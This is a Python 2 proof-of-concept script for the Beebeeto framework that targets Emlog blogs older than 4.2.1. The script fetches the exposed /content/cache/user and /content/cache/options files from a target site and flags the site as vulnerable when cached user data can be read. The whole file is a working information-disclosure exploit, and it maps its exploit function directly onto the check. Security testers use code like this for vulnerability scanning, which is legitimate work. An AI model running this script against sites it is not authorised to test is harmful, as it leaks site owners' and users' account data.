#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0177',
            'name': 'Emlog <4.2.1 /content/cache/user 信息泄漏漏洞 POC',
            'author': '我只会打连连看',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'EMLOG',
            'vul_version': ['<4.2.1'],
            'type': 'Information Disclosure',
            'tag': ['EMLOG漏洞', '敏感信息泄漏', '/content/cache/user', 'php'],
            'desc': '漏洞文件：/content/cache/user ,  /content/cache/options',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-02955',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload1 = '/content/cache/user'
        payload2 = '/content/cache/options'
        verify_url = args['options']['target'] + payload1
        verify_url2 = args['options']['target'] + payload2
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] Request URL: ' + verify_url2
        # user
        content = urllib2.urlopen(verify_url).read()
        # options
        content2 = urllib2.urlopen(verify_url2).read()
        if args['options']['target'] in content2 and 'avatar' in content:
            args['success'] = True
            args['poc_ret']['vul_url']= verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())